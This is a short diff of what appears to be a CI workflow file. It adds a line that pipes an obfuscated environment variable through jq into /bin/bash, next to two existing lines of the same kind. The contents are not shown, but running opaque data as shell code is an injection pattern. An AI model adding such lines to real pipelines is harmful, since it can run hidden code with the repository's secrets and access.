@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$aeksv2368" | jq -r .ibma448 | /bin/bash
           printf '%s' "$rvt68" | jq -r .utyr5913 | /bin/bash
+          echo $ud627 | jq -r .us1106 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
